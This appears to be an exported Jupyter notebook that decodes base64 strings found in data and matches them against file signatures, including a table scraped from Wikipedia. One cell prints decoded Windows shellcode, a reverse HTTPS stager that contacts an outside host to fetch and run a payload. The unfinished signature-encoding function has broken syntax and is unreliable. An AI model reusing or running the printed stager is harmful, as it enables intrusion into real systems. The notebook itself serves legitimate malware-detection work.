# 0  76050ca7b230deacd50e2829be0bd62af491d319
# 1  921bef2bc138dce83a5cb227e218e01489adf9fe
# 2  3275d01bf7db9078a09b7de36c7c2821598a6a9f
#
#                                               sha256
# 0  00fc93fb3bc7fbf8671019e8e69629c1bbe2d672998b02...
# 1  55ce084c3fc194037670ddc344afb37917f5c3c521aa25...
# 2  ef0a1b51fd3e4bccbc60c9c00c2802e7baeb6ba2cf60a7...

# %%
print(output_files[['decoded_string']].at[2, 'decoded_string'])
# Out:
# ['fc', 'e8', '89', '00', '00', '00', '60', '89', 'e5', '31', 'd2', '64', '8b', '52', '30', '8b', '52', '0c', '8b', '52', '14', '8b', '72', '28', '0f', 'b7', '4a', '26', '31', 'ff', '31', 'c0', 'ac', '3c', '61', '7c', '02', '2c', '20', 'c1', 'cf', '0d', '01', 'c7', 'e2', 'f0', '52', '57', '8b', '52', '10', '8b', '42', '3c', '01', 'd0', '8b', '40', '78', '85', 'c0', '74', '4a', '01', 'd0', '50', '8b', '48', '18', '8b', '58', '20', '01', 'd3', 'e3', '3c', '49', '8b', '34', '8b', '01', 'd6', '31', 'ff', '31', 'c0', 'ac', 'c1', 'cf', '0d', '01', 'c7', '38', 'e0', '75', 'f4', '03', '7d', 'f8', '3b', '7d', '24', '75', 'e2', '58', '8b', '58', '24', '01', 'd3', '66', '8b', '0c', '4b', '8b', '58', '1c', '01', 'd3', '8b', '04', '8b', '01', 'd0', '89', '44', '24', '24', '5b', '5b', '61', '59', '5a', '51', 'ff', 'e0', '58', '5f', '5a', '8b', '12', 'eb', '86', '5d', '68', '6e', '65', '74', '00', '68', '77', '69', '6e', '69', '54', '68', '4c', '77', '26', '07', 'ff', 'd5', 'e8', '80', '00', '00', '00', '4d', '6f', '7a', '69', '6c', '6c', '61', '2f', '35', '2e', '30', '20', '28', '57', '69', '6e', '64', '6f', '77', '73', '20', '4e', '54', '20', '36', '2e', '31', '3b', '20', '57', '4f', '57', '36', '34', '3b', '20', '54', '72', '69', '64', '65', '6e', '74', '2f', '37', '2e', '30', '3b', '20', '72', '76', '3a', '31', '31', '2e', '30', '29', '20', '6c', '69', '6b', '65', '20', '47', '65', '63', '6b', '6f', '00', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '58', '00', '59', '31', 'ff', '57', '57', '57', '57', '51', '68', '3a', '56', '79', 'a7', 'ff', 'd5', 'e9', '93', '00', '00', '00', '5b', '31', 'c9', '51', '51', '6a', '03', '51', '51', '68', 'bb', '01', '00', '00', '53', '50', '68', '57', '89', '9f', 'c6', 'ff', 'd5', '89', 'c3', 'eb', '7a', '59', '31', 'd2', '52', '68', '00', '32', 'a0', '84', '52', '52', '52', '51', '52', '50', '68', 'eb', '55', '2e', '3b', 'ff', 'd5', '89', 'c6', '68', '80', '33', '00', '00', '89', 'e0', '6a', '04', '50', '6a', '1f', '56', '68', '75', '46', '9e', '86', 'ff', 'd5', '31', 'ff', '57', '57', '57', '57', '56', '68', '2d', '06', '18', '7b', 'ff', 'd5', '85', 'c0', '74', '48', '31', 'ff', '85', 'f6', '74', '04', '89', 'f9', 'eb', '09', '68', 'aa', 'c5', 'e2', '5d', 'ff', 'd5', '89', 'c1', '68', '45', '21', '5e', '31', 'ff', 'd5', '31', 'ff', '57', '6a', '07', '51', '56', '50', '68', 'b7', '57', 'e0', '0b', 'ff', 'd5', 'bf', '00', '2f', '00', '00', '39', 'c7', '75', '04', '89', 'd8', 'eb', '8a', '31', 'ff', 'eb', '15', 'eb', '49', 'e8', '81', 'ff', 'ff', 'ff', '2f', '50', '51', '42', '79', '00', '00', '68', 'f0', 'b5', 'a2', '56', 'ff', 'd5', '6a', '40', '68', '00', '10', '00', '00', '68', '00', '00', '40', '00', '57', '68', '58', 'a4', '53', 'e5', 'ff', 'd5', '93', '53', '53', '89', 'e7', '57', '68', '00', '20', '00', '00', '53', '56', '68', '12', '96', '89', 'e2', 'ff', 'd5', '85', 'c0', '74', 'cd', '8b', '07', '01', 'c3', '85', 'c0', '75', 'e5', '58', 'c3', 'e8', '1d', 'ff', 'ff', 'ff', '73', '73', '6c', '2e', '73', '65', '63', '75', '72', '65', '6c', '6f', '67', '6f', '6e', '77', '65', '62', '2e', '63', '6f', '6d', '00']

# %% [markdown]
# ## Experimental section pulling down additional file types from Wikipedia
# Under construction

# %%
file_sigs_tables = pd.read_html('https://en.wikipedia.org/wiki/List_of_file_signatures', header=0)

# %%
def hex_sig_converter(cell):
    import re
    if('(' in cell):
        return re.sub('\s*\([^)]+\)\s*', '\n', cell)
    else:
        return cell

def extension_converter(cell):
    from textwrap import wrap
    if(cell and cell.strip() and len(cell) >= 6 and ' ' not in cell):
        return cell[0:3]
    else:
        return cell
                             

file_sigs_tables2 = pd.read_html('https://en.wikipedia.org/wiki/List_of_file_signatures', 
                                header=0, converters={'Hex signature':hex_sig_converter, 'File extension':extension_converter}, encoding=None)
file_sigs_tables2[0]
# Out:
#                                                                                       Hex signature  \
# 0                                                                           a1 b2 c3 d4 d4 c3 b2 a1
# 1                                                                                       0a 0d 0d 0a
# 2                                                                                       ed ab ee db
# 3                                                                                       53 50 30 31
# 4                                                                                                00
# 5                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
# 6                                                                                       BE BA FE CA
# 7                                                                                       00 01 42 44
# 8                                                                                       00 01 44 54
# 9                                                                                       00 01 00 00
# 10                                                                                      00 00 01 00
# 11                                                                                66 74 79 70 33 67
# 12                                                                                            1F 9D
# 13                                                                                            1F A0
# 14                                                              42 41 43 4B 4D 49 4B 45 44 49 53 4B
# 15                                                                                         42 5A 68
# 16                                                              47 49 46 38 37 61 47 49 46 38 39 61
# 17                                                                       49 49 2A 00\n4D 4D 00 2A\n
# 18                                                                    49 49 2A 00 10 00 00 00 43 52
# 19                                                                                      80 2A 5F D7
# 20                                                                          52 4E 43 01 52 4E 43 02
# 21                                                                       53 44 50 58\n58 50 44 53\n
# 22                                                                                      76 2F 31 01
# 23                                                                                      42 50 47 FB
# 24   FF D8 FF DB FF D8 FF E0 00 10 4A 46 49 46 00 01FF D8 FF EE FF D8 FF E1 ?? ?? 45 78 69 66 00 00
# 25                                                              46 4F 52 4D ?? ?? ?? ?? 49 4C 42 4D
# 26                                                              46 4F 52 4D ?? ?? ?? ?? 38 53 56 58
# 27                                                              46 4F 52 4D ?? ?? ?? ?? 41 43 42 4D
# 28                                                              46 4F 52 4D ?? ?? ?? ?? 41 4E 42 4D
# 29                                                              46 4F 52 4D ?? ?? ?? ?? 41 4E 49 4D
# 30                                                              46 4F 52 4D ?? ?? ?? ?? 46 41 58 58
# 31                                                              46 4F 52 4D ?? ?? ?? ?? 46 54 58 54
# 32                                                              46 4F 52 4D ?? ?? ?? ?? 53 4D 55 53
# 33                                                              46 4F 52 4D ?? ?? ?? ?? 43 4D 55 53
# 34                                                              46 4F 52 4D ?? ?? ?? ?? 59 55 56 4E
# 35                                                              46 4F 52 4D ?? ?? ?? ?? 46 41 4E 54
# 36                                                              46 4F 52 4D ?? ?? ?? ?? 41 49 46 46
# 37                                                                                      49 4E 44 58
# 38                                                                                      4C 5A 49 50
# 39                                                                                            4D 5A
# 40                                                           50 4B 03 04 50 4B 05 06\n50 4B 07 08\n
# 41                                                                             52 61 72 21 1A 07 00
# 42                                                                          52 61 72 21 1A 07 01 00
# 43                                                                                      7F 45 4C 46
# 44                                                                          89 50 4E 47 0D 0A 1A 0A
# 45                                                                                      CA FE BA BE
# 46                                                                                         EF BB BF
# 47                                                                                      FE ED FA CE
# 48                                                                                      FE ED FA CF
# 49                                                                                      CE FA ED FE
# 50                                                                                      CF FA ED FE
# 51                                                                                            FF FE
# 52                                                                                      FF FE 00 00
# 53                                                                                      25 21 50 53
# 54                                                                                25 50 44 46 2d 0a
# 55                                                  30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C
# 56                                                                          24 53 44 49 30 30 30 31
# 57                                                                                      4F 67 67 53
# 58                                                                                      38 42 50 53
# 59                                                              52 49 46 46 ?? ?? ?? ?? 57 41 56 45
# 60                                                              52 49 46 46 ?? ?? ?? ?? 41 56 49 20
# 61                                                                                            FF FB
# 62                                                                                         49 44 33
# 63                                                                                            42 4D
# 64                                                                                   43 44 30 30 31
# 65        53 49 4D 50 4C 45 20 20 3D 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 54
# 66                                                                                      66 4C 61 43
# 67                                                                                      4D 54 68 64
# 68                                                                          D0 CF 11 E0 A1 B1 1A E1
# 69                                                                          64 65 78 0A 30 33 35 00
# 70                                                                                         4B 44 4D
# 71                                                                                      43 72 32 34
# 72                                                                                      41 47 44 33
# 73                                05 07 00 00 42 4F 42 4F 05 07 00 00 00 00 00 00 00 00 00 00 00 01
# 74                                06 07 E1 00 42 4F 42 4F 06 07 E1 00 00 00 00 00 00 00 00 00 00 01
# 75                                                           45 52 02 00 00 00 8B 45 52 02 00 00 00
# 76                                                                             78 01 73 0D 62 62 60
# 77                                                                                      78 61 72 21
# 78                                                                          50 4D 4F 43 43 4D 4F 43
# 79                                                                                      4E 45 53 1A
# 80                                                  75 73 74 61 72 00 30 30 75 73 74 61 72 20 20 00
# 81                                                                                      74 6F 78 33
# 82                                                                                      4D 4C 56 49
# 83                                                                          44 43 4D 01 50 41 33 30
# 84                                                                                37 7A BC AF 27 1C
# 85                                                                                            1F 8B
# 86                                                                             FD 37 7A 58 5A 00 00
# 87                                                                                      04 22 4D 18
# 88                                                                                      4D 53 43 46
# 89                                                                          53 5A 44 44 88 F0 27 33
# 90                                                                                      46 4C 49 46
# 91                                                                                      1A 45 DF A3
# 92                                                                                      4D 49 4C 20
# 93                                                     41 54 26 54 46 4F 52 4D ?? ?? ?? ?? 44 4A 56
# 94                                                                                            30 82
# 95                                                                                      44 49 43 4D
# 96                                                                                      77 4F 46 46
# 97                                                                                      77 4F 46 32
# 98                                                                                3c 3f 78 6d 6c 20
# 99                                                                                      00 61 73 6d
# 100                                                                                        cf 84 01
# 101                                                                               43 57 53 46 57 53
# 102                                                                            21 3C 61 72 63 68 3E
# 103                                                             52 49 46 46 ?? ?? ?? ?? 57 45 42 50
# 104                                                                                     27 05 19 56
# 105                                                                               7B 5C 72 74 66 31
# 106                                                                                     54 41 50 45
# 107                                                                                              47
# 108                                                                                     00 00 01 BA
# 109                                                                        00 00 01 BA4700 00 01 B3
# 110                                                                                 78 0178 9C78 DA
# 111                                                                                     62 76 78 32
# 112                                                                                        4F 52 43
# 113                                                                                     4F 62 6A 01
# 114                                                                                     53 45 51 36
# 115                                                                                     65 87 78 56
# 116                                                                                     55 55 aa aa
# 117                                                                                        78 56 34
# 118                                                                                     50 41 52 31
# 119                                                                                     45 4D 58 32
# 120                                                                                     45 4D 55 33
# 121                                                                                     1B 4C 75 61
# 122                                                 62 6F 6F 6B 62 6F 6F 6B 00 00 00 00 6D 61 72 6B
# 123                                                       5B 5A 6F 6E 65 54 72 61 6E 73 66 65 72 5D
# 124                                                                         52 65 63 65 69 76 65 64
# 125                                                             20 02 01 62 A0 1E AB 07 02 00 00 00
# 126                                                                                     28 B5 2F FD
#
#                              ISO 8859-1                               Offset  \
# 0                             ¡²ÃÔ ÔÃ²¡                                    0
# 1                                  ....                                    0
# 2                                  ....                                    0
# 3                                  SP01                                    0
# 4                                     .                                    0
# 5            ........ ........ ........                                   11
# 6                                   ...                                    0
# 7                                  ..BD                                    0
# 8                                  ..DT                                    0
# 9                                   ...                                    0
# 10                                 ....                                    0
# 11                               ftyp3g                                    4
# 12                                   ..                                    0
# 13                                   ..                                    0
# 14                        BACKMIKE DISK                                    0
# 15                                  BZh                                    0
# 16                        GIF87a GIF89a                                    0
# 17                            II*. MM.*                                    0
# 18                          II*..... CR                                    0
# 19                                 .*_.                                    0
# 20                                 RNC.                                    0
# 21                            SDPX XPDS                                    0
# 22                                 v/1.                                    0
# 23                                 BPGû                                    0
# 24   ÿØÿÛ ÿØÿà..JFIF..ÿØÿî ÿØÿá..Exif..                                    0
# 25                        FORM.... ILBM                                0 any
# 26                        FORM.... 8SVX                                0 any
# 27                        FORM.... ACBM                                0 any
# 28                        FORM.... ANBM                                0 any
# 29                        FORM.... ANIM                                0 any
# 30                        FORM.... FAXX                                0 any
# 31                        FORM.... FTXT                                0 any
# 32                        FORM.... SMUS                                0 any
# 33                        FORM.... CMUS                                0 any
# 34                        FORM.... YUVN                                0 any
# 35                        FORM.... FANT                                0 any
# 36                        FORM.... AIFF                                0 any
# 37                                 INDX                                    0
# 38                                 LZIP                                    0
# 39                                   MZ                                    0
# 40                                 PK..                                    0
# 41                              Rar!...                                    0
# 42                             Rar!....                                    0
# 43                                 .ELF                                    0
# 44                             .PNG....                                    0
# 45                                 Êþº¾                                    0
# 46                                  ï»¿                                    0
# 47                             ........                             0 0x1000
# 48                             ........                             0 0x1000
# 49                             ........                                    0
# 50                             ........                                    0
# 51                                   ..                                    0
# 52                                 ....                                    0
# 53                                 %!PS                                    0
# 54                                %PDF-                                    0
# 55                    0&²u.fÏ .¦Ù.ª.bÎl                                    0
# 56                             $SDI0001                                    0
# 57                                 OggS                                    0
# 58                                 8BPS                                    0
# 59                        RIFF.... WAVE                                    0
# 60                        RIFF.... AVI.                                    0
# 61                                   ÿû                                    0
# 62                                  ID3                                    0
# 63                                   BM                                    0
# 64                                CD001                  0x8001 0x88010x9001
# 65                           SIMPLE = T                                    0
# 66                                 fLaC                                    0
# 67                                 MThd                                    0
# 68                                  NaN                                    0
# 69                             dex.035.                                    0
# 70                                  KDM                                    0
# 71                                 Cr24                                    0
# 72                                 AGD3                                    0
# 73               ....BOBO ........ ....                                    0
# 74               ....BOBO ........ ....                                    0
# 75                       ER.... ãER....                                    0
# 76                              x.s.bb`                                    0
# 77                                 xar!                                    0
# 78                             PMOCCMOC                                    0
# 79                                  NES                                    0
# 80                     ustar.00 ustar .                                0x101
# 81                                  TOX                                    0
# 82                                 MLVI                                    0
# 83                             DCM PA30                                    0
# 84                                7z¼¯'                                    0
# 85                                   ..                                    0
# 86                              ²7zXZ..                                    0
# 87                                 ."M.                                    0
# 88                                 MSCF                                    0
# 89                             SZDD....                                    0
# 90                                 FLIF                                    0
# 91                                 .Eß£                                    0
# 92                                  MIL                                    0
# 93                      AT&TFORM....DJV                                    0
# 94                                   0.                                    0
# 95                                 DICM                                 0x80
# 96                                 wOFF                                    0
# 97                                 wOF2                                    0
# 98                                <?xml                                    0
# 99                                 .asm                                    0
# 100                                 NaN                                    0
# 101                             CWS FWS                                    0
# 102                            !<arch>.                                    0
# 103                       RIFF.... WEBP                                    0
# 104                                '..V                                    0
# 105                              {\rtf1                                    0
# 106                                TAPE                                    0
# 107                                   G  0 0xBC 0x178 ... (every 188th byte)
# 108                                ....                                    0
# 109                           ....G....                                    0
# 110                                ....                                    0
# 111                                bvx2                                    0
# 112                                 ORC                                    0
# 113                                Obj.                                    0
# 114                                SEQ6                                    0
# 115                                e.xV                                    0
# 116                                UU¬¬                                    0
# 117                                 xV4                                    0
# 118                                PAR1                                    0
# 119                                EMX2                                    0
# 120                                EMU3                                    0
# 121                                .Lua                                    0
# 122                           book mark                                    0
# 123                      [ZoneTransfer]                                    0
# 124                           Received:                                    0
# 125                         ..b .«.....                                    0
# 126                                (µ/ý                                    0
#
#                                                                                                                   File extension  \
# 0                                                                                                                           pcap
# 1                                                                                                                            pca
# 2                                                                                                                            rpm
# 3                                                                                                                            bin
# 4                                                                                                                            PIC
# 5                                                                                                                            PDB
# 6                                                                                                                            DBA
# 7                                                                                                                            DBA
# 8                                                                                                                            TDA
# 9                                                                                                                            NaN
# 10                                                                                                                           ico
# 11                                                                                                                           3gp
# 12                                                                                                                           zta
# 13                                                                                                                           zta
# 14                                                                                                                           bac
# 15                                                                                                                           bz2
# 16                                                                                                                           gif
# 17                                                                                                                           tif
# 18                                                                                                                           cr2
# 19                                                                                                                           cin
# 20                                                                                                                           NaN
# 21                                                                                                                           dpx
# 22                                                                                                                           exr
# 23                                                                                                                           bpg
# 24                                                                                                                           jpg
# 25                                                                                                                           ilb
# 26                                                                                                                           8sv
# 27                                                                                                                           acb
# 28                                                                                                                           anb
# 29                                                                                                                           ani
# 30                                                                                                                           fax
# 31                                                                                                                           ftx
# 32                                                                                                                           smu
# 33                                                                                                                           cmu
# 34                                                                                                                           yuv
# 35                                                                                                                           iff
# 36                                                                                                                           aif
# 37                                                                                                                           idx
# 38                                                                                                                            lz
# 39                                                                                                                           exe
# 40                                                                                                                           zip
# 41                                                                                                                           rar
# 42                                                                                                                           rar
# 43                                                                                                                           NaN
# 44                                                                                                                           png
# 45                                                                                                                         class
# 46                                                                                                                           NaN
# 47                                                                                                                           NaN
# 48                                                                                                                           NaN
# 49                                                                                                                           NaN
# 50                                                                                                                           NaN
# 51                                                                                                                           NaN
# 52                                                                                                                           NaN
# 53                                                                                                                            ps
# 54                                                                                                                           pdf
# 55                                                                                                                           asf
# 56                                                                                                                           NaN
# 57                                                                                                                           ogg
# 58                                                                                                                           psd
# 59                                                                                                                           wav
# 60                                                                                                                           avi
# 61                                                                                                                           mp3
# 62                                                                                                                           mp3
# 63                                                                                                                           bmp
# 64                                                                                                                           iso
# 65                                                                                                                          fits
# 66                                                                                                                          flac
# 67                                                                                                                           mid
# 68                                                                                                                           doc
# 69                                                                                                                           dex
# 70                                                                                                                          vmdk
# 71                                                                                                                           crx
# 72                                                                                                                           fh8
# 73                                                                                                                           cwk
# 74                                                                                                                           cwk
# 75                                                                                                                         toast
# 76                                                                                                                           dmg
# 77                                                                                                                           xar
# 78                                                                                                                           dat
# 79                                                                                                                           nes
# 80                                                                                                                           tar
# 81                                                                                                                           tox
# 82                                                                                                                           MLV
# 83                                                                                                                           NaN
# 84                                                                                                                            7z
# 85                                                                                                                           gzt
# 86                                                                                                                           xzt
# 87                                                                                                                           lz4
# 88                                                                                                                           cab
# 89   Various. (Replacing the last character of the original file extension with an underscore, e.g. setup.exe becomes setup.ex_)
# 90                                                                                                                          flif
# 91                                                                                                                           mkv
# 92                                                                                                                           stg
# 93                                                                                                                           djv
# 94                                                                                                                           der
# 95                                                                                                                           dcm
# 96                                                                                                                          woff
# 97                                                                                                                         woff2
# 98                                                                                                                           XML
# 99                                                                                                                          wasm
# 100                                                                                                                          lep
# 101                                                                                                                          swf
# 102                                                                                                                          deb
# 103                                                                                                                         webp
# 104                                                                                                                          NaN
# 105                                                                                                                          rtf
# 106                                                                                                                          NaN
# 107                                                                                                                   ts tsv tsa
# 108                                                                                                                      m2p vob
# 109                                                                                                                     mpg mpeg
# 110                                                                                                                         zlib
# 111                                                                                                                        lzfse
# 112                                                                                                                          orc
# 113                                                                                                                         avro
# 114                                                                                                                           rc
# 115                                                                                                                      p25 obt
# 116                                                                                                                          pcv
# 117                                                                                     pbt pdt pea peb pet pgt pict pjt pkt pmt
# 118                                                                                                                          NaN
# 119                                                                                                                          ez2
# 120                                                                                                                      ez3 iso
# 121                                                                                                                         luac
# 122                                                                                                                        alias
# 123                                                                                                                          Ide
# 124                                                                                                                          eml
# 125                                                                                                                          tde
# 126                                                                                                                          zst
#
#                                                                                                                                                                        Description
# 0                                                                                                                                                           Libpcap File Format[1]
# 1                                                                                                                                         PCAP Next Generation Dump File Format[2]
# 2                                                                                                                                         RedHat Package Manager (RPM) package [3]
# 3                                                                                                                                                 Amazon Kindle Update Package [4]
# 4                                                               IBM Storyboard bitmap file Windows Program Information File Mac Stuffit Self-Extracting Archive IRIS OCR data file
# 5                                                                                                                                                 PalmPilot Database/Document File
# 6                                                                                                                                                    Palm Desktop Calendar Archive
# 7                                                                                                                                                       Palm Desktop To Do Archive
# 8                                                                                                                                                    Palm Desktop Calendar Archive
# 9                                                                                                                                           Palm Desktop Data File (Access format)
# 10                                                                                                                                     Computer icon encoded in ICO file format[5]
# 11                                                                                                              3rd Generation Partnership Project 3GPP and 3GPP2 multimedia files
# 12                                                                                                                compressed file (often tar zip) using Lempel-Ziv-Welch algorithm
# 13                                                                                                                             Compressed file (often tar zip) using LZH algorithm
# 14                                     File or tape containing a backup done with AmiBack on an Amiga. It typically is paired with an index file (idx) with the table of contents.
# 15                                                                                                                                           Compressed file using Bzip2 algorithm
# 16                                                                                                                  Image file encoded in the Graphics Interchange Format (GIF)[6]
# 17                                                                                                                                                        Tagged Image File Format
# 18                                                                                             Canon RAW Format Version 2[7]Canon's RAW format is based on the TIFF file format[8]
# 19                                                                                                                                                              Kodak Cineon image
# 20                                                                                                       Compressed file using Rob Northen Compression (version 1 and 2) algorithm
# 21                                                                                                                                                                 SMPTE DPX image
# 22                                                                                                                                                                   OpenEXR image
# 23                                                                                                                                              Better Portable Graphics format[9]
# 24                                                                                                                                     JPEG raw or in the JFIF or Exif file format
# 25                                                                                                                                                    IFF Interleaved Bitmap Image
# 26                                                                                                                                                         IFF 8-Bit Sampled Voice
# 27                                                                                                                                                         Amiga Contiguous Bitmap
# 28                                                                                                                                                             IFF Animated Bitmap
# 29                                                                                                                                                               IFF CEL Animation
# 30                                                                                                                                                             IFF Facsimile Image
# 31                                                                                                                                                              IFF Formatted Text
# 32                                                                                                                                                        IFF Simple Musical Score
# 33                                                                                                                                                               IFF Musical Score
# 34                                                                                                                                                                   IFF YUV Image
# 35                                                                                                                                                         Amiga Fantavision Movie
# 36                                                                                                                                                   Audio Interchange File Format
# 37                                                                                                 Index file to a file or tape containing a backup done with AmiBack on an Amiga.
# 38                                                                                                                                                            lzip compressed file
# 39                                                                                                         DOS MZ executable file format and its descendants (including NE and PE)
# 40                                                                                                                zip file format and formats based on it, such as JAR, ODF, OOXML
# 41                                                                                                                                            RAR archive version 1.50 onwards[10]
# 42                                                                                                                                             RAR archive version 5.0 onwards[11]
# 43                                                                                                                                                  Executable and Linkable Format
# 44                                                                                                                       Image encoded in the Portable Network Graphics format[12]
# 45                                                                                                                                              Java class file, Mach-O Fat Binary
# 46                                                                                                             UTF-8 encoded Unicode byte order mark, commonly seen in text files.
# 47                                                                                                                                                          Mach-O binary (32-bit)
# 48                                                                                                                                                          Mach-O binary (64-bit)
# 49                                                                                                                        Mach-O binary (reverse byte ordering scheme, 32-bit)[13]
# 50                                                                                                                        Mach-O binary (reverse byte ordering scheme, 64-bit)[13]
# 51                                                                                           Byte-order mark for text file encoded in little-endian 16-bit Unicode Transfer Format
# 52                                                                                           Byte-order mark for text file encoded in little-endian 32-bit Unicode Transfer Format
# 53                                                                                                                                                             PostScript document
# 54                                                                                                                                                                PDF document[14]
# 55                                                                                                                                                     Advanced Systems Format[15]
# 56                                                                                                                  System Deployment Image, a disk image format used by Microsoft
# 57                                                                                                                                      Ogg, an open source media container format
# 58                                                                                                                   Photoshop Document file, Adobe Photoshop's native file format
# 59                                                                                                                                                      Waveform Audio File Format
# 60                                                                                                                                             Audio Video Interleave video format
# 61                                                                           MPEG-1 Layer 3 file without an ID3 tag or with an ID3v1 tag (which's appended at the end of the file)
# 62                                                                                                                                                MP3 file with an ID3v2 container
# 63                                                                                                                      BMP file, a bitmap format used mostly in the Windows world
# 64                                                                                                                                                   ISO9660 CD/DVD image file[16]
# 65                                                                                                                                      Flexible Image Transport System (FITS)[17]
# 66                                                                                                                                                   Free Lossless Audio Codec[18]
# 67                                                                                                                                                             MIDI sound file[19]
# 68       Compound File Binary Format, a container format used for document by older versions of Microsoft Office.[20] It is however an open format used by other programs as well.
# 69                                                                                                                                                               Dalvik Executable
# 70                                                                                                                                                              VMDK files[21][22]
# 71                                                                                                                                 Google Chrome extension[23] or packaged app[24]
# 72                                                                                                                                                 FreeHand 8 document[25][26][27]
# 73                                                                                                                                                           AppleWorks 5 document
# 74                                                                                                                                                           AppleWorks 6 document
# 75                                                                                                         Roxio Toast disc image file, also some .dmg-files begin with same bytes
# 76                                                                                                                                                           Apple Disk Image file
# 77                                                                                                                                                   eXtensible ARchive format[28]
# 78                                                          Windows Files And Settings Transfer Repository[29] See also USMT 3.0 (Win XP)[30] and USMT 4.0 (Win 7)[31] User Guides
# 79                                                                                                                                      Nintendo Entertainment System ROM file[32]
# 80                                                                                                                                                                 tar archive[33]
# 81                                                                                                                                             Open source portable voxel file[34]
# 82                                                                                                                                                    Magic Lantern Video file[35]
# 83                                                                                                                                     Windows Update Binary Delta Compression[36]
# 84                                                                                                                                                               7-Zip File Format
# 85                                                                                                                                                        GZIP compressed file[37]
# 86                                                                                                                                  XZ compression utility using LZMA2 compression
# 87                                                                                               LZ4 Frame Format[38] Remark: LZ4 block format does not offer any magic bytes.[39]
# 88                                                                                                                                                          Microsoft Cabinet file
# 89   Microsoft compressed file in Quantum format, used prior to Windows XP. File can be decompressed using Extract.exe or Expand.exe distributed with earlier versions of Windows.
# 90                                                                                                                                                      Free Lossless Image Format
# 91                                                                                                                                        Matroska media container, including WebM
# 92                                  "SEAN : Session Analysis" Training file. Also used in compatible software "Rpw : Rowperfect for Windows" and "RP3W : ROWPERFECT3 for Windows".
# 93                                                                            DjVu documentThe following byte is either 55 (U) for single-page or 4D (M) for multi-page documents.
# 94                                                                                                                                                   DER encoded X.509 certificate
# 95                                                                                                                                                       DICOM Medical File Format
# 96                                                                                                                                                            WOFF File Format 1.0
# 97                                                                                                                                                            WOFF File Format 2.0
# 98                                                                                                              eXtensible Markup Language when using the ASCII character encoding
# 99                                                                                                                                                   WebAssembly binary format[40]
# 100                                                                                                                                               Lepton compressed JPEG image[41]
# 101                                                                                                                                                                     flash .swf
# 102                                                                                                                                                                 linux deb file
# 103                                                                                                                                                         Google WebP image file
# 104                                                                                                                         U-Boot / uImage. Das U-Boot Universal Boot Loader.[42]
# 105                                                                                                                                                               Rich Text Format
# 106                                                                                                                                                          Microsoft Tape Format
# 107                                                                                                                                          MPEG Transport Stream (MPEG-2 Part 1)
# 108                                                                                                  MPEG Program Stream (MPEG-1 Part 1 (essentially identical) and MPEG-2 Part 1)
# 109                                                                      MPEG Program Stream MPEG Transport Stream MPEG-1 video and MPEG-2 video (MPEG-1 Part 2 and MPEG-2 Part 2)
# 110                                                                                                                        No Compression/low Default Compression Best Compression
# 111                                                                       LZFSE - Lempel-Ziv style data compression algorithm using Finite State Entropy coding. OSS by Apple.[43]
# 112                                                                                                                                Apache ORC (Optimized Row Columnar) file format
# 113                                                                                                                                                 Apache Avro binary file format
# 114                                                                                                                                                    RCFile columnar file format
# 115                                                                                                                                                      PhotoCap Object Templates
# 116                                                                                                                                                                PhotoCap Vector
# 117                                                                                                                                                              PhotoCap Template
# 118                                                                                                                                            Apache Parquet columnar file format
# 119                                                                                                                                                     Emulator Emaxsynth samples
# 120                                                                                                                                                     Emulator III synth samples
# 121                                                                                                                                                               Lua bytecode[44]
# 122                                                                                                                                           macOS file Alias[45] (Symbolic link)
# 123                                                                                                                           Microsoft Zone Identifier for URL Security Zones[46]
# 124                                                                                                                                                         Email Message var5[47]
# 125                                                                                                                                                             Tableau Datasource
# 126                                                                                                                                              Zstandard compressed file[48][49]

# %%
def encode_part_string(hex_string):
    try:
        sig_bytes = bytes.fromhex((hex_string.replace(' ', '')))
        encoded_string = base64.b64encode(sig_bytes).decode('utf-8')
        return encoded_string.replace('=', '')
    except:
        return None
        
def encode_sig_to_bas64(hex_string):
    """Get additional file signatures from Wikipedia"""
    if '\n' in hex_string:
        inputs = hex_string.split('\n')
    else:
        inputs = [hex_string]

    str_start = 0
    for input_str in inputs:
        output_string = ''
        if '??' in input_str:
            matched = re.search(r'(?P<wild_cards>\?\?\s*{1:})', input_str)
            str_end = matched.start() - 1
            output_string = encode_part_string(input_str[str_start:str_end])
            num_wild_cards = matched..groupdict()['wild_cards'].count('??')
            re_expression = 
            print('wild_cards', num_wild_cards)
    if '(big endian format)' in hex_string:
        hex_strings = hex_string.split('(big endian format)')
        print('endian')
        print(hex_strings)
    
    print('In:', hex_string, 'Bytes:', sig_bytes, 'Out:', encoded_string, 'type', type(encoded_string))
    if encoded_string:
        return encoded_string.replace('=', '')

file_sigs_src_tables = pd.read_html('https://en.wikipedia.org/wiki/List_of_file_signatures', header=0)
file_signatures = file_sigs_src_tables[0].copy()
file_signatures['EncodedSignature'] = file_signatures.apply(lambda x: encode_sig_to_bas64(x['Hex signature']), axis=1)
file_signatures
# Out:
# In: a1 b2 c3 d4 d4 c3 b2 a1 Bytes: b'\xa1\xb2\xc3\xd4\xd4\xc3\xb2\xa1' Out: obLD1NTDsqE= type <class 'str'>
# In: 0a 0d 0d 0a Bytes: b'\n\r\r\n' Out: Cg0NCg== type <class 'str'>
# In: ed ab ee db Bytes: b'\xed\xab\xee\xdb' Out: 7avu2w== type <class 'str'>
# In: 53 50 30 31 Bytes: b'SP01' Out: U1AwMQ== type <class 'str'>
# In: 00 Bytes: b'\x00' Out: AA== type <class 'str'>
# In: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Bytes: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' Out: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA type <class 'str'>
# In: BE BA FE CA Bytes: b'\xbe\xba\xfe\xca' Out: vrr+yg== type <class 'str'>
# In: 00 01 42 44 Bytes: b'\x00\x01BD' Out: AAFCRA== type <class 'str'>
# In: 00 01 44 54 Bytes: b'\x00\x01DT' Out: AAFEVA== type <class 'str'>
# In: 00 01 00 00 Bytes: b'\x00\x01\x00\x00' Out: AAEAAA== type <class 'str'>
